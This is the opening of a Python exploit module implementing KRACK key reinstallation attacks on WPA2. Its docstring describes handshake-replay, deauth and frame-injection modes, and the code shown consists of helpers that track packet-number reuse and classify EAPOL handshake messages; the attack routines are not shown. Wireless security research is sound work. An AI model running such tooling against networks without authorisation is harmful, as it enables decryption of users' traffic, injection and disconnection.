#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native KRACK — Key Reinstallation Attacks on WPA2 (CVE-2017-13077..13088).

Implements detection and exploitation of key reinstallation vulnerabilities
in the WPA2 4-way handshake and group key handshake:

  - 4way_replay        Replay Message 3 to trigger PTK reinstallation
  - group_replay       Replay Group Key Message 1 to reset group PN
  - ft_test            Test FT (Fast Transition) reassociation key reuse
  - broadcast_replay   Replay broadcast frames to test group key replay
  - monitor            Passive monitoring for key reinstallation indicators
  - deauth_trigger     Send deauth to force re-handshake, then capture

The attack forces nonce/counter reuse in CCMP, enabling frame decryption
and potential injection.

Improvements incorporated from upstream vanhoefm/krackattacks-scripts:
  - FT handshake vulnerability test (issue #84)
  - GTK init logic fix (issue #100)
  - Deauth-triggered handshake capture for reliable msg3 collection
  - pycryptodome 3.19+ compatibility (PR #102)

Requires: Monitor mode interface with injection, modified hostapd
(for Message 3 replay in AP mode). Passive tests work with any adapter.

Dependencies: scapy, pycryptodome.

Version: 1.1.0
"""


import logging
import os
import threading
import time
from collections import defaultdict
from typing import Dict, List

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os

logger = logging.getLogger(__name__)

try:
    from scapy.all import (
        ARP,
        EAPOL,
        ICMP,
        IP,
        LLC,
        SNAP,
        Dot11,
        Dot11Auth,
        Dot11CCMP,
        Dot11Deauth,
        Dot11QoS,
        RadioTap,
        Raw,
        conf,
        get_if_hwaddr,
        sendp,
        sniff,
    )
    from scapy.contrib.wpa_eapol import WPA_key
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from Cryptodome.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False

HANDSHAKE_TRANSMIT_INTERVAL = 2

# EAPOL Key Info flags
EAPOL_KEY_INFO_PAIRWISE = 0x0008
EAPOL_KEY_INFO_ACK = 0x0080
EAPOL_KEY_INFO_MIC = 0x0100
EAPOL_KEY_INFO_SECURE = 0x0200
EAPOL_KEY_INFO_ENCRYPTED = 0x1000


class IvTracker:
    """Track IVs/PNs per MAC address for replay detection."""

    def __init__(self) -> None:
        self._seen: dict[str, list[int]] = defaultdict(list)
        self._reuse_count: dict[str, int] = defaultdict(int)

    def observe(self, mac: str, pn: int) -> bool:
        """Record a PN observation. Returns True if reuse detected."""
        history = self._seen[mac]
        reused = False

        if history and pn <= history[-1] and pn != 0:
            self._reuse_count[mac] += 1
            reused = True

        history.append(pn)
        if len(history) > 2000:
            self._seen[mac] = history[-1000:]

        return reused

    def get_stats(self) -> dict[str, dict[str, int]]:
        """Get IV/PN statistics per MAC."""
        return {
            mac: {
                "observed": len(pns),
                "min": min(pns) if pns else 0,
                "max": max(pns) if pns else 0,
                "reuses": self._reuse_count[mac],
            }
            for mac, pns in self._seen.items()
        }


def _extract_pn(pkt) -> int:
    """Extract 48-bit Packet Number from Dot11CCMP."""
    ccmp = pkt[Dot11CCMP]
    return (ccmp.PN5 << 40 | ccmp.PN4 << 32 | ccmp.PN3 << 24 |
            ccmp.PN2 << 16 | ccmp.PN1 << 8 | ccmp.PN0)


def _is_eapol_msg3(pkt) -> bool:
    """Check if packet is EAPOL 4-way handshake Message 3."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and (key_info & EAPOL_KEY_INFO_MIC)
            and (key_info & EAPOL_KEY_INFO_SECURE)
            and (key_info & EAPOL_KEY_INFO_ENCRYPTED)
        )
    except Exception:
        return False


def _is_eapol_msg1(pkt) -> bool:
    """Check if packet is EAPOL 4-way handshake Message 1."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and not (key_info & EAPOL_KEY_INFO_MIC)
        )
    except Exception:
        return False


def _is_group_msg1(pkt) -> bool:
    """Check if packet is Group Key handshake Message 1."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            not (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and (key_info & EAPOL_KEY_INFO_MIC)
            and (key_info & EAPOL_KEY_INFO_SECURE)
            and (key_info & EAPOL_KEY_INFO_ENCRYPTED)
        )
    except Exception:
        return False


@requires_os(OSRequirement.LINUX_ONLY)
